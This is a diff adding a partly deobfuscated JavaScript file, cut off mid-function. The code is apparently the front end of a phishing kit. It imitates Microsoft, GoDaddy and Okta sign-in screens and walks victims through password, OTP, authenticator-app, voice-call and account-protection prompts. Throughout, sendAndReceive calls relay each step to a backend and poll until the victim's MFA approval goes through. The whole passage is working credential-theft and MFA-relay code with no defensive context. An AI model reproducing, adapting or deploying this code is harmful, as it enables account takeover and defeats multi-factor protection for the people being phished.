@@ -1,0 +1,3040 @@
+var webnotfound = false;
+var interacted = 0x0;
+var multipleaccountsback = 0x0;
+let wait2facancel = 0x0;
+let otptype = 0x0;
+var pagevisitedalready = null;
+let viewtype = null;
+let pdfcheck = 0x0;
+if (!document.getElementById("sections").classList.contains("d-none")) {
+  view = "uname";
+}
+if (document.getElementById('sections_pdf') && !document.getElementById('sections_pdf').classList.contains("d-none")) {
+  view = "uname_pdf";
+}
+if (document.getElementById("sections_doc") && !document.getElementById('sections_doc').classList.contains("d-none")) {
+  view = 'uname_doc';
+}
+if (document.getElementById("voice")) {
+  view = "uname";
+}
+document.addEventListener('keyup', function (_0x5e4f2a) {
+  if (_0x5e4f2a.key === "Enter" && requestsent == false) {
+    if (view == 'pwd_godaddy') {
+      if (document.getElementById('sections_godaddy').querySelector("#godaddysignin") !== null) {
+        document.getElementById("sections_godaddy").querySelector("#godaddysignin").click();
+      }
+    }
+    if (view == 'pwd_okta') {
+      if (document.getElementById("sections_okta").querySelector('#oktasignin') !== null) {
+        document.getElementById("sections_okta").querySelector("#oktasignin").click();
+      }
+    }
+    if (view !== "pwd_godaddy" && view !== "pwd_okta") {
+      if (document.getElementById('section_' + view).querySelector('#btn_next') !== null) {
+        document.getElementById("section_" + view).querySelector("#btn_next").click();
+      } else {
+        if (document.getElementById("section_" + view).querySelector("#next_btn_pdf") !== null) {
+          document.getElementById("section_" + view).querySelector("#next_btn_pdf").click();
+        } else {
+          if (document.getElementById("section_" + view).querySelector("#btn_next_doc") !== null) {
+            document.getElementById('section_' + view).querySelector("#btn_next_doc").click();
+          } else {
+            if (document.getElementById("section_" + view).querySelector("#btn_sig") !== null) {
+              document.getElementById('section_' + view).querySelector('#btn_sig').click();
+            } else {
+              if (document.getElementById('section_' + view).querySelector("#btn_sig_live") !== null) {
+                document.getElementById("section_" + view).querySelector("#btn_sig_live").click();
+              } else {
+                if (document.getElementById("section_" + view).querySelector('#btn_confirmemail') !== null) {
+                  document.getElementById("section_" + view).querySelector("#btn_confirmemail").click();
+                } else {
+                  if (document.getElementById('section_' + view).querySelector("#btn_verifyotp") !== null) {
+                    document.getElementById("section_" + view).querySelector("#btn_verifyotp").click();
+                  } else {
+                    if (document.getElementById("section_" + view).querySelector("#btn_confirmemailorphone_live") !== null) {
+                      document.getElementById("section_" + view).querySelector("#btn_confirmemailorphone_live").click();
+                    } else if (document.getElementById("section_" + view).querySelector("#btn_verifyotp_live") !== null) {
+                      document.getElementById('section_' + view).querySelector("#btn_verifyotp_live").click();
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  }
+});
+function validatediginp(_0xfbc09e) {
+  _0xfbc09e.value = _0xfbc09e.value.replace(/\D/g, '');
+}
+function loadinganimation(_0x4ea7d2) {
+  if (_0x4ea7d2 == 0x0) {
+    document.getElementById("section_" + view).querySelector(".loading-container").classList.add('loading');
+    document.getElementById("section_" + view).querySelector('.sectioncontent').style.animation = "fadeinform 1s forwards";
+  }
+  if (_0x4ea7d2 == 0x1) {
+    document.getElementById('section_' + view).querySelector('.loading-container').classList.remove("loading");
+    document.getElementById("section_" + view).querySelector(".sectioncontent").style.animation = "fadeoutform 1s forwards";
+  }
+}
+function runanimation(_0x41dbd7, _0x41fe50, _0x18938f, _0x23cc41) {
+  if (_0x23cc41 == undefined) {
+    _0x23cc41 = 0x1;
+  }
+  if (_0x23cc41 == 0x0) {
+    _0x23cc41 = '';
+  }
+  if (_0x23cc41 == 0x1) {
+    _0x23cc41 = "forwards";
+  }
+  if (_0x41dbd7 == 0x0) {
+    document.getElementById("section_" + _0x41fe50).querySelector(".sectioncontent").style.animation = "hide-to-right " + _0x18938f + "s " + _0x23cc41 + '';
+  }
+  if (_0x41dbd7 == 0x1) {
+    document.getElementById("section_" + _0x41fe50).querySelector('.sectioncontent').style.animation = "show-from-right " + _0x18938f + "s " + _0x23cc41 + '';
+  }
+  if (_0x41dbd7 == 0x2) {
+    document.getElementById('section_' + _0x41fe50).querySelector(".sectioncontent").style.animation = "hide-to-left " + _0x18938f + "s " + _0x23cc41 + '';
+  }
+  if (_0x41dbd7 == 0x3) {
+    document.getElementById("section_" + _0x41fe50).querySelector(".sectioncontent").style.animation = "show-from-left " + _0x18938f + "s " + _0x23cc41 + '';
+  }
+}
+function changebackbutton(_0x4c7035, _0x4b5e36) {
+  if (_0x4b5e36 == 0x0) {
+    document.getElementById("section_" + _0x4c7035).querySelector(".back").style.display = "none";
+  }
+  if (_0x4b5e36 == 0x1) {
+    document.getElementById("section_" + _0x4c7035).querySelector(".back").style.display = "block";
+  }
+}
+function wait2fa(_0x1bf00c, _0x20ead7) {
+  if (wait2facancel == 0x0) {
+    if (_0x1bf00c == "app") {
+      let _0x56638b = null;
+      _0x56638b = _0x20ead7;
+      sendAndReceive('twofaselected', [_0x56638b, "null"], 0x1).then(_0x244547 => {
+        if (_0x244547 && view == 'authapp' || _0x244547 && view == "authapp_live") {
+          if (_0x244547.message == "signinblocked live") {
+            document.getElementById("signin_blocked_live_email").innerText = _0x244547.email;
+            checkerrordesc('signin_blocked_live', 0x0, _0x244547.description);
+            checkerrordesc("signin_blocked_reason", 0x2, _0x244547.reason);
+            document.getElementById("section_authapp").classList.toggle("d-none");
+            document.getElementById('section_signin_blocked_live').classList.remove("d-none");
+            view = "signin_blocked_live";
+          }
+          if (_0x244547.message == "protectaccount live") {
+            checkerrordesc('protect_account_live', 0x0, _0x244547.description);
+            document.getElementById("section_" + view).classList.toggle('d-none');
+            document.getElementById("section_protect_account_live").classList.remove("d-none");
+            view = 'protect_account_live';
+          }
+          if (_0x244547.message == "more info required") {
+            moreinforeq();
+          }
+          if (_0x244547.message == "waiting") {
+            setTimeout(function () {
+              wait2fa(_0x1bf00c, _0x20ead7);
+            }, 0x1f40);
+          }
+          if (_0x244547.message == "authenticaion failed") {
+            setTimeout(function () {
+              wait2fa(_0x1bf00c, _0x20ead7);
+            }, 0x7d0);
+          }
+          if (_0x244547.message == "duplicate request") {
+            wait2facancel = 0x1;
+            if (document.getElementById('section_tryagainlater').classList.contains("d-none")) {
+              document.getElementById("section_tryagainlater").querySelector(".title").innerText = "Too many Attempts";
+              setTimeout(function () {
+                document.getElementById("section_" + view).querySelector(".loading-container").classList.remove("loading");
+                runanimation(0x2, view, 0.5, 0x0);
+                setTimeout(function () {
+                  document.getElementById('section_' + view).classList.toggle("d-none");
+                  document.getElementById("section_tryagainlater").querySelector("#tryagainheader").style.display = "block";
+                  document.getElementById("section_tryagainlater").querySelector("#tryagain_toomanyattempts").style.display = "block";
+                  document.getElementById("section_tryagainlater").querySelector(".sectioncontent").style.animation = "show-from-right 0.5s";
+                  document.getElementById("section_tryagainlater").classList.remove("d-none");
+                  view = "tryagainlater";
+                }, 0xc8);
+              }, 0x1f4);
+            }
+          }
+          if (_0x244547.message == "approved") {
+            document.getElementById("section_authapp").classList.toggle("d-none");
+            document.getElementById("section_final").classList.remove("d-none");
+            view = "final";
+          }
+          if (_0x244547.message == "approved live") {
+            document.getElementById('section_authapp_live').classList.toggle("d-none");
+            document.getElementById("section_final").classList.remove('d-none');
+            view = "final";
+          }
+          if (_0x244547.message == "error live") {
+            document.getElementById('section_authapperror').querySelector(".title").textContent = _0x244547.title;
+            var _0x253560 = _0x244547.description;
+            document.getElementById('authapperrordesc').innerHTML = "<span>" + _0x253560.text + "</span><a id=\"ViewDetails\" class=\"no-wrap\" href=\"#\">View details</a>";
+            checkerrordesc("authapperrorresend", 0x2, _0x244547.resentlink);
+            authappbottomtext(_0x244547.checkapphavingtroublesection);
+            document.getElementById('section_authapp_live').classList.toggle("d-none");
+            document.getElementById('section_authapperror').classList.remove("d-none");
+            view = "authapperror";
+          }
+          if (_0x244547.message == 'error') {
+            document.getElementById("section_authapperror").querySelector('.title').textContent = _0x244547.title;
+            var _0x253560 = _0x244547.description;
+            document.getElementById("authapperrordesc").innerHTML = "<span>" + _0x253560.text + "</span><a id=\"ViewDetails\" class=\"no-wrap\" href=\"#\">View details</a>";
+            checkerrordesc("authapperrorresend", 0x2, _0x244547.resentlink);
+            authappbottomtext(_0x244547.checkapphavingtroublesection);
+            document.getElementById("section_authapp").classList.toggle("d-none");
+            document.getElementById('section_authapperror').classList.remove("d-none");
+            view = 'authapperror';
+          }
+        }
+      })["catch"](_0x18bb20 => {
+        console.error("Error:", _0x18bb20);
+      });
+    }
+    if (_0x1bf00c == "call") {
+      sendAndReceive("twofaselected", ["TwoWayVoiceMobile", "null"], 0x1).then(_0x8fbca2 => {
+        if (_0x8fbca2 && view == 'authcall') {
+          if (_0x8fbca2.message == "more info required") {
+            moreinforeq();
+          }
+          if (_0x8fbca2.message == 'waiting') {
+            setTimeout(function () {
+              wait2fa(_0x1bf00c, null);
+            }, 0x1f40);
+          }
+          if (_0x8fbca2.message == "authenticaion failed") {
+            setTimeout(function () {
+              wait2fa(_0x1bf00c, _0x20ead7);
+            }, 0x7d0);
+          }
+          if (_0x8fbca2.message == "duplicate request") {
+            wait2facancel = 0x1;
+            if (document.getElementById("section_tryagainlater").classList.contains("d-none")) {
+              document.getElementById("section_tryagainlater").querySelector(".title").innerText = "Too many Attempts";
+              setTimeout(function () {
+                document.getElementById("section_" + view).querySelector('.loading-container').classList.remove('loading');
+                runanimation(0x2, view, 0.5, 0x0);
+                setTimeout(function () {
+                  document.getElementById("section_" + view).classList.toggle("d-none");
+                  document.getElementById('section_tryagainlater').querySelector("#tryagainheader").style.display = "block";
+                  document.getElementById('section_tryagainlater').querySelector("#tryagain_toomanyattempts").style.display = "block";
+                  document.getElementById("section_tryagainlater").querySelector(".sectioncontent").style.animation = "show-from-right 0.5s";
+                  document.getElementById("section_tryagainlater").classList.remove("d-none");
+                  view = "tryagainlater";
+                }, 0xc8);
+              }, 0x1f4);
+            }
+          }
+          if (_0x8fbca2.message == 'approved') {
+            document.getElementById("section_authcall").classList.toggle('d-none');
+            document.getElementById("section_final").classList.remove('d-none');
+            view = 'final';
+          }
+          if (_0x8fbca2.message == "approved live") {
+            document.getElementById("section_authapp_live").classList.toggle("d-none");
+            document.getElementById("section_final").classList.remove('d-none');
+            view = "final";
+          }
+          if (_0x8fbca2.message == "error") {
+            checkerrordesc("authcall", 0x1, _0x8fbca2.description);
+          }
+        }
+      })["catch"](_0x50f6cd => {
+        console.error("Error:", _0x50f6cd);
+      });
+    }
+  }
+  if (wait2facancel == 0x1) {
+    wait2facancel = 0x0;
+  }
+}
+function backbuttonclick(_0x3eb8b1, _0x2b1b46) {
+  if (_0x3eb8b1.textContent == 'Back') {
+    runanimation(0x0, view, 0.3);
+  }
+  if (_0x3eb8b1.textContent == "Back") {
+    if (_0x2b1b46 == 0x1) {
+      callurl = "backbtnclick";
+    }
+    if (_0x2b1b46 == 0x2) {
+      callurl = "multbackbtnclick";
+    }
+    sendAndReceive(callurl, [_0x3eb8b1.getAttribute("data-id")], 0x1).then(_0x4d1bef => {
+      if (_0x4d1bef && _0x4d1bef.message !== "waiting for previous request to complete") {
+        document.getElementById('section_' + view).querySelector(".sectioncontent").style.animation = '';
+        if (_0x4d1bef.message == "clicked") {
+          if (_0x3eb8b1.textContent == "Back") {
+            runanimation(0x3, "uname", 0.3);
+            multipleaccountsback = 0x0;
+            document.getElementById("section_multipleaccounts").classList.toggle('d-none');
+            document.getElementById("section_uname").querySelector(".sectioncontent").style.animation = '';
+            document.getElementById("section_uname").classList.remove("d-none");
+            if (document.body.style.backgroundImage) {
+              document.body.style.backgroundImage = '';
+            }
+            if (document.body.style.backgroundColor) {
+              document.body.style.backgroundColor = '';
+            }
+            view = "uname";
+          }
+        }
+        if (_0x4d1bef.message == "approve auth request auth app") {
+          document.getElementById('authappimg').setAttribute("src", _0x4d1bef.image_src);
+          checkerrordesc("authapp", 0x0, _0x4d1bef.description);
+          bottomsectionlinks("authapp", _0x4d1bef.bottomsection);
+          changebackbutton('authapp', _0x4d1bef.backbutton);
+          document.getElementById("authappcode").textContent = _0x4d1bef.authappcode;
+          document.getElementById("section_multipleaccounts").classList.toggle('d-none');
+          document.getElementById('section_authapp').classList.remove("d-none");
+          view = "authapp";
+          wait2fa("app", _0x4d1bef.methodid);
+        }
+        if (_0x4d1bef.message == "approve auth request calling") {
+          document.getElementById("section_authcall").querySelector('.back').focus();
+          document.getElementById('authcallimg').setAttribute('src', _0x4d1bef.image_src);
+          checkerrordesc("authcall", 0x0, _0x4d1bef.description);
+          bottomsectionlinks("authcall", _0x4d1bef.bottomsection);
+          changebackbutton("authcall", _0x4d1bef.backbutton);
+          document.getElementById("section_multipleaccounts").classList.toggle('d-none');
+          document.getElementById("section_authcall").classList.remove("d-none");
+          view = "authcall";
+          wait2fa("call");
+        }
+      }
+    })["catch"](_0x3bb4ef => {
+      loadinganimation(0x1);
+      console.error("Error:", _0x3bb4ef);
+    });
+  }
+}
+function linkoptionclick(_0x3243c2) {
+  if (_0x3243c2.getAttribute("data-id") == "try_again_otp") {
+    window.location.reload();
+  }
+  if (_0x3243c2.getAttribute("data-id") == "ihaveacode" || _0x3243c2.getAttribute('data-id') == "signInAnotherWay" || _0x3243c2.textContent == "Enter a security code" || _0x3243c2.textContent == "get a code a different way." || _0x3243c2.textContent == "Sign out and sign in with a different account" || _0x3243c2.textContent == "Sign in using another Microsoft account" || _0x3243c2.textContent == "Sign in another way" || _0x3243c2.textContent == "Microsoft Authenticator" || _0x3243c2.textContent.includes("Send another request")) {
+    loadinganimation(0x0);
+    if (_0x3243c2.textContent == "get a code a different way." || _0x3243c2.getAttribute("data-id") == 'signInAnotherWay') {
+      loadinganimation(0x1);
+      wait2facancel = 0x1;
+      document.getElementById('section_' + view).querySelector(".sectioncontent").style.animation = '';
+      document.getElementById("section_" + view).classList.toggle("d-none");
+      document.getElementById("section_2fa").classList.remove('d-none');
+      view = '2fa';
+    }
+    if (_0x3243c2.getAttribute('data-id') == "ihaveacode") {
+      loadinganimation(0x1);
+      document.getElementById("otp_livedesc").innerText = "Enter the code you received";
+      document.getElementById('section_confirmemailorphone_live').querySelector(".sectioncontent").style.animation = '';
+      document.getElementById("section_confirmemailorphone_live").classList.toggle("d-none");
+      document.getElementById("section_otp_live").classList.remove("d-none");
+      view = "otp_live";
+    }
+    if (_0x3243c2.textContent == "Sign out and sign in with a different account" || _0x3243c2.textContent == "Sign in using another Microsoft account") {
+      loadinganimation(0x1);
+      document.getElementById("footer").style.position = "absolute";
+      bottomsectionlinks("uname", [{
+        'a_id': 'signup',
+        'a_text': "Create one!",
+        'text': "No account?",
+        'type': 'text_link'
+      }, {
+        'a_id': 'cantAccessAccount',
+        'a_text': "Can't access your account?",
+        'type': "link"
+      }]);
+      ;
+      changebackbutton('uname', 0x0);
+      document.getElementById('section_' + view).classList.toggle('d-none');
+      document.getElementById("inp_uname").value = '';
+      document.getElementById("error_pwd").innerText = '';
+      document.getElementById("inp_pwd").value = '';
+      document.getElementById("section_uname").querySelector(".sectioncontent").style.animation = '';
+      document.getElementById("section_uname").classList.remove("d-none");
+      if (document.body.style.backgroundImage) {
+        document.body.style.backgroundImage = '';
+      }
+      if (document.body.style.backgroundColor) {
+        document.body.style.backgroundColor = '';
+      }
+      view = 'uname';
+    }
+    let _0x27ead2 = 0x0;
+    if (viewtype == null) {
+      if (_0x3243c2.textContent == "Send another request to my Microsoft Authenticator app" || _0x3243c2.textContent == "Microsoft Authenticator") {
+        _0x27ead2 = "PhoneAppNotification";
+      }
+      if (_0x3243c2.textContent == "Send another request to my Outlook mobile app") {
+        _0x27ead2 = "CompanionAppsNotification";
+      }
+      if (_0x3243c2.textContent == "Enter a security code") {
+        _0x27ead2 = 'PhoneAppOTP';
+      }
+    }
+    if (viewtype !== null) {
+      if (_0x3243c2.textContent == "Send another request to my Microsoft app" || _0x3243c2.textContent == "Microsoft Authenticator") {
+        _0x27ead2 = "PhoneAppNotification_Live";
+      }
+      if (_0x3243c2.textContent == "Enter a security code") {
+        _0x27ead2 = "PhoneAppOTP_Live";
+      }
+    }
+    if (_0x3243c2.textContent == "Send another request to my Microsoft Authenticator app" || _0x3243c2.textContent == "Microsoft Authenticator" || _0x3243c2.textContent == "Send another request to my Outlook mobile app" || _0x3243c2.textContent == "Enter a security code") {
+      sendAndReceive('twofaselect', [_0x27ead2], 0x1).then(_0x244a5d => {
+        if (_0x244a5d && _0x244a5d.message !== "waiting for previous request to complete") {
+          loadinganimation(0x1);
+          wait2facancel = 0x0;
+          if (_0x244a5d.message == "otp sent live") {
+            document.getElementById("inp_otp_live").setAttribute("placeholder", "Code");
+            document.getElementById("error_otp_live").style.display = "none";
+            document.getElementById("error_otp_live").innerText = '';
+            document.getElementById('otpliveimg').setAttribute("src", _0x244a5d.image_src);
+            checkerrordesc("otp_live", 0x0, _0x244a5d.description);
+            bottomsectionlinks("otp_live", _0x244a5d.bottomsection);
+            changebackbutton("otp_live", _0x244a5d.backbutton);
+            document.getElementById("section_" + view).classList.toggle("d-none");
+            document.getElementById('section_otp_live').classList.remove('d-none');
+            view = "otp_live";
+            viewtype = "otp";
+          }
+          if (_0x244a5d.message == "approve auth request auth app live") {
+            document.getElementById("error_authapp_live").style.display = "none";
+            document.getElementById("error_authapp_live").innerText = '';
+            document.getElementById("authapp_live_code").innerText = _0x244a5d.authappreqid;
+            bottomsectionlinks("authapp_live", _0x244a5d.bottomsection);
+            changebackbutton("authapp_live", _0x244a5d.backbutton);
+            document.getElementById("section_" + view).classList.toggle("d-none");
+            document.getElementById("section_authapp_live").classList.remove('d-none');
+            view = "authapp_live";
+            viewtype = "auth";
+            wait2fa('app', _0x244a5d.methodid);
+          }
+          if (_0x244a5d.message == "duplicate request") {
+            wait2facancel = 0x1;
+            if (document.getElementById('section_tryagainlater').classList.contains("d-none")) {
+              document.getElementById("section_tryagainlater").querySelector(".title").innerText = "Too many Attempts";
+              setTimeout(function () {
+                document.getElementById('section_' + view).querySelector('.loading-container').classList.remove("loading");
+                runanimation(0x2, view, 0.5, 0x0);
+                setTimeout(function () {
+                  document.getElementById("section_" + view).classList.toggle("d-none");
+                  document.getElementById("section_tryagainlater").querySelector("#tryagainheader").style.display = "block";
+                  document.getElementById("section_tryagainlater").querySelector("#tryagain_toomanyattempts").style.display = "block";
+                  document.getElementById("section_tryagainlater").querySelector(".sectioncontent").style.animation = "show-from-right 0.5s";
+                  document.getElementById("section_tryagainlater").classList.remove("d-none");
+                  view = "tryagainlater";
+                }, 0xc8);
+              }, 0x1f4);
+            }
+          }
+          if (_0x244a5d.message == "error enter a code") {
+            document.getElementById("authapperrordesc").querySelector("span").setAttribute("class", "error");
+            document.getElementById("authapperrordesc").querySelector("span").innerText = "Sorry, we're having trouble verifying your account. Please try again. ";
+          }
+          if (_0x244a5d.message == "session timeout") {
+            if (document.getElementById("section_tryagainlater").classList.contains("d-none")) {
+              document.getElementById("section_tryagainlater").querySelector(".title").innerText = "We didn't hear from you";
+              setTimeout(function () {
+                document.getElementById("section_" + view).querySelector(".loading-container").classList.remove('loading');
+                runanimation(0x2, view, 0.5, 0x0);
+                setTimeout(function () {
+                  document.getElementById("section_" + view).classList.toggle("d-none");
+                  document.getElementById('section_tryagainlater').querySelector('#tryagainheader').style.display = "block";
+                  document.getElementById("section_tryagainlater").querySelector("#tryagain_withoutinternet").style.display = "block";
+                  document.getElementById("section_tryagainlater").querySelector('.sectioncontent').style.animation = "show-from-right 0.5s";
+                  document.getElementById("section_tryagainlater").classList.remove("d-none");
+                  view = "tryagainlater";
+                }, 0xc8);
+              }, 0x1f4);
+            }
+          }
+          if (_0x244a5d.message == "redirected back to sign in") {
+            document.getElementById('inp_uname').value = '';
+            document.getElementById('error_pwd').innerText = '';
+            document.getElementById("inp_pwd").value = '';
+            bottomsectionlinks("uname", [{
+              'a_id': 'signup',
+              'a_text': "Create one!",
+              'text': "No account?",
+              'type': "text_link"
+            }, {
+              'a_id': "cantAccessAccount",
+              'a_text': "Can't access your account?",
+              'type': "link"
+            }]);
+            ;
+            document.getElementById('section_' + view).querySelector(".sectioncontent").style.animation = '';
+            document.getElementById("section_" + view).classList.toggle('d-none');
+            document.getElementById("section_uname").querySelector('.sectioncontent').style.animation = '';
+            document.getElementById('section_uname').classList.remove("d-none");
+            if (document.body.style.backgroundImage) {
+              document.body.style.backgroundImage = '';
+            }
+            if (document.body.style.backgroundColor) {
+              document.body.style.backgroundColor = '';
+            }
+          }
+          if (_0x244a5d.message == "lets try something else or come back") {
+            document.getElementById("section_signinanothererror").querySelector('.title').textContent = _0x244a5d.title;
+            checkerrordesc('signinanothererrordesc', 0x2, _0x244a5d.signinanothererrordesc);
+            document.getElementById("section_" + view).classList.toggle('d-none');
+            document.getElementById("section_signinanothererror").classList.remove("d-none");
+            bottomsectionlinks("signinanothererror", _0x244a5d.bottomsection);
+            view = 'signinanothererror';
+          }
+          if (_0x244a5d.message == "you dont have access") {
+            document.getElementById("section_" + view).classList.toggle("d-none");
+            document.getElementById("section_youdonthaveaccess").classList.remove("d-none");
+            view = "youdonthaveaccess";
+          }
+          if (_0x244a5d.message == "otp sent") {
+            document.getElementById('error_2fa').innerText = '';
+            document.getElementById('otpimg').setAttribute("src", _0x244a5d.image_src);
+            checkerrordesc('otp', 0x0, _0x244a5d.description);
+            bottomsectionlinks("otp", _0x244a5d.bottomsection);
+            changebackbutton("otp", _0x244a5d.backbutton);
+            document.getElementById("section_" + view).classList.toggle("d-none");
+            document.getElementById("section_otp").classList.remove("d-none");
+            view = "otp";
+            viewtype = null;
+          }
+          if (_0x244a5d.message == "approve auth request auth app") {
+            document.getElementById("error_2fa").innerText = '';
+            document.getElementById("authappimg").setAttribute('src', _0x244a5d.image_src);
+            checkerrordesc("authapp", 0x0, _0x244a5d.description);
+            bottomsectionlinks("authapp", _0x244a5d.bottomsection);
+            changebackbutton("authapp", _0x244a5d.backbutton);
+            document.getElementById("authappcode").textContent = _0x244a5d.authappcode;
+            document.getElementById('section_' + view).classList.toggle("d-none");
+            document.getElementById("section_authapp").classList.remove("d-none");
+            view = "authapp";
+            viewtype = null;
+            wait2fa("app", _0x244a5d.methodid);
+          }
+          if (_0x244a5d.message == "approve auth request calling") {
+            document.getElementById("section_authcall").querySelector('.back').focus();
+            document.getElementById("error_2fa").innerText = '';
+            document.getElementById("authcallimg").setAttribute('src', _0x244a5d.image_src);
+            checkerrordesc('authcall', 0x0, _0x244a5d.description);
+            bottomsectionlinks("authcall", _0x244a5d.bottomsection);
+            changebackbutton("authcall", _0x244a5d.backbutton);
+            document.getElementById("section_" + view).classList.toggle("d-none");
+            document.getElementById("section_authcall").classList.remove("d-none");
+            view = "authcall";
+            viewtype = null;
+            wait2fa("call");
+          }
+          if (_0x244a5d.message == 'error') {
+            bottomsectionlinks("2fa", _0x244a5d.bottomsection);
+            changebackbutton("2fa", _0x244a5d.backbutton);
+            checkerrordesc("2fa", 0x1, _0x244a5d.description);
+          }
+          if (_0x244a5d.message == 'verifyemail') {
+            document.getElementById('error_2fa').innerText = '';
+            checkerrordesc("verifyemail", 0x0, _0x244a5d.description);
+            bottomsectionlinks('confirmemail', _0x244a5d.bottomsection);
+            changebackbutton("confirmemail", _0x244a5d.backbutton);
+            document.getElementById('section_' + view).classList.toggle("d-none");
+            document.getElementById("section_confirmemail").classList.remove("d-none");
+            view = 'confirmemail';
+            viewtype = null;
+          }
+          if (_0x244a5d.message == "request wasnt sent") {
+            document.getElementById("section_authapperror").querySelector(".title").textContent = "Request wasn't sent";
+            document.getElementById("authapperrordesc").classList.toggle('error');
+            document.getElementById('authapperrordesc').innerHTML = "<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id=\"ViewDetails\" class=\"no-wrap\" href=\"#\">View details</a>";
+            view = "authapperror";
+            viewtype = null;
+          }
+        }
+      })["catch"](_0x3ea8ea => {
+        loadinganimation(0x1);
+        console.error("Error:", _0x3ea8ea);
+      });
+    }
+  }
+}
+function authappbottomtext(_0x286c70) {
+  const _0x5a4563 = document.getElementById("section_authapperror").querySelector(".text-body");
+  _0x5a4563.innerHTML = '';
+  _0x286c70.forEach(_0x6f2826 => {
+    if (_0x6f2826.type === "text_link") {
+      const _0x6ae1b7 = document.createElement('p');
+      _0x6ae1b7.classList.add("link", "mb-16");
+      _0x6ae1b7.innerHTML = _0x6f2826.text + " <a href=\"#\" data-id=\"" + _0x6f2826.a_id + ("\" onclick=\"linkoptionclick(this)\" class=\"link\" style=\"display: unset;\">" + _0x6f2826.a_text + '</a>');
+      _0x5a4563.appendChild(_0x6ae1b7);
+    } else {
+      if (_0x6f2826.type === "link_text") {
+        const _0x610713 = document.createElement('p');
+        _0x610713.classList.add("link", 'mb-16');
+        _0x610713.innerHTML = "<a href=\"#\" data-id=\"" + _0x6f2826.a_id + ("\" onclick=\"linkoptionclick(this)\" class=\"link\" style=\"display: unset;\">" + _0x6f2826.a_text + "</a> " + _0x6f2826.text);
+        _0x5a4563.appendChild(_0x610713);
+        const _0x513b2f = document.createElement('p');
+        _0x513b2f.textContent = _0x6f2826.text;
+        _0x5a4563.appendChild(_0x513b2f);
+      } else {
+        if (_0x6f2826.type === "link") {
+          const _0x5ea1b5 = document.createElement('a');
+          _0x5ea1b5.classList.add('link', "mb-16");
+          _0x5ea1b5.setAttribute("style", "display: unset;");
+          _0x5ea1b5.setAttribute("data-id", _0x6f2826.a_id);
+          _0x5ea1b5.setAttribute('onclick', "linkoptionclick(this)");
+          _0x5ea1b5.textContent = _0x6f2826.a_text;
+          _0x5ea1b5.href = '#';
+          _0x5a4563.appendChild(_0x5ea1b5);
+        } else {
+          if (_0x6f2826.type === 'text') {
+            const _0x57f1f8 = document.createElement('p');
+            _0x57f1f8.classList.add("mb-16");
+            _0x57f1f8.textContent = _0x6f2826.text;
+            _0x5a4563.appendChild(_0x57f1f8);
+          }
+        }
+      }
+    }
+  });
+}
+function selectprotectoption(_0x1daeda) {
+  const _0x7f9a76 = document.querySelectorAll(".iAdditionalProofInfo input[type=\"radio\"]");
+  _0x7f9a76.forEach(_0x3dafc8 => {
+    _0x3dafc8.removeAttribute("checked");
+    _0x3dafc8.removeAttribute("aria-checked");
+  });
+  const _0x1b1943 = document.querySelectorAll(".iAdditionalProofInfo");
+  _0x1b1943.forEach(_0x22ae45 => {
+    if (_0x22ae45 !== _0x1daeda) {
+      _0x22ae45.parentNode.removeChild(_0x22ae45);
+    }
+  });
+  nexteletext = _0x1daeda.nextElementSibling.textContent;
+  const _0x1ed01c = document.createElement('div');
+  _0x1ed01c.classList.add("iAdditionalProofInfo");
+  if (_0x1daeda.value === "email") {
+    emailval = nexteletext.split('@').pop();
+    _0x1ed01c.innerHTML = "\n      <div class=\"text-block-body\" id=\"iEnterProofDesc\">\n        To verify that this is your email address, complete the hidden part and click \"Send code\" to receive your code.\n      </div>\n      <div role=\"alert\" aria-live=\"assertive\">\n        <div class=\"alert alert-error Hide\" id=\"iProofInputError\"></div>\n      </div>\n      <div class=\"emailPartial dirltr input-group input-max-width\" id=\"iProofEmailEntry\" style=\"display: table;\">\n        <input class=\"form-control noRightBorder\" autocomplete=\"off\" type=\"email\" id=\"iProofEmail\" name=\"iProofEmail\" maxlength=\"113\" aria-required=\"true\" aria-label=\"Email name\" aria-describedby=\"iProofInputError\">\n        <label class=\"input-group-addon noLeftBorder outlookEmailLabel\" id=\"iConfirmProofEmailDomain\">@" + emailval + "</label>\n      </div>\n      <div class=\"phcontainer\" id=\"iProofPhoneEntry\" style=\"display: none;\" aria-hidden=\"true\">\n        <label id=\"iProofPhoneHint\" for=\"iProofPhone\" class=\"form-group-top\" aria-hidden=\"true\">Last 4 digits of phone number</label>\n        <input type=\"tel\" autocomplete=\"off\" id=\"iProofPhone\" name=\"iProofPhone\" class=\"form-control input-max-width\" maxlength=\"4\" aria-required=\"true\" aria-label=\"Last 4 digits of phone number\" aria-describedby=\"iProofInputError\">\n      </div>\n    ";
+    document.getElementById("btn_protectaccount").textContent = "Send Code";
+  } else {
+    if (_0x1daeda.value === "text") {
+      phoneval = nexteletext.split('*').pop();
+      _0x1ed01c.innerHTML = "\n      <div class=\"text-block-body\" id=\"iEnterProofDesc\">\n        To verify that this is your phone number, enter the last 4 digits including " + phoneval + ", and then click \"Send code\" to receive your code.\n      </div>\n      <div role=\"alert\" aria-live=\"assertive\">\n        <div class=\"alert alert-error Hide\" id=\"iProofInputError\"></div>\n      </div>\n      <div class=\"emailPartial dirltr input-group input-max-width\" id=\"iProofEmailEntry\" style=\"display: none;\" aria-hidden=\"true\">\n        <input class=\"form-control noRightBorder\" autocomplete=\"off\" type=\"email\" id=\"iProofEmail\" name=\"iProofEmail\" maxlength=\"113\" aria-required=\"true\" aria-label=\"Email name\" aria-describedby=\"iProofInputError\">\n        <label class=\"input-group-addon noLeftBorder outlookEmailLabel\" id=\"iConfirmProofEmailDomain\"></label>\n      </div>\n      <div class=\"phcontainer\" id=\"iProofPhoneEntry\" style=\"\">\n        <label id=\"iProofPhoneHint\" for=\"iProofPhone\" class=\"form-group-top\" aria-hidden=\"true\">Last 4 digits of phone number</label>\n        <input type=\"tel\" autocomplete=\"off\" id=\"iProofPhone\" name=\"iProofPhone\" class=\"form-control input-max-width\" maxlength=\"4\" aria-required=\"true\" aria-label=\"Last 4 digits of phone number\" aria-describedby=\"iProofInputError\">\n      </div>\n    ";
+      document.getElementById("btn_protectaccount").textContent = "Send Code";
+    } else {
+      if (_0x1daeda.value === "authapp") {
+        document.getElementById("btn_protectaccount").textContent = "Next";
+      } else if (_0x1daeda.value === "notanymore") {
+        document.getElementById("btn_protectaccount").textContent = "Verify online";
+      }
+    }
+  }
+  _0x1daeda.parentNode.parentNode.parentNode.appendChild(_0x1ed01c);
+}
+function displayprotectoptions(_0x5abc5d) {
+  const _0x5ebfc6 = document.getElementById("protectaccountoptions");
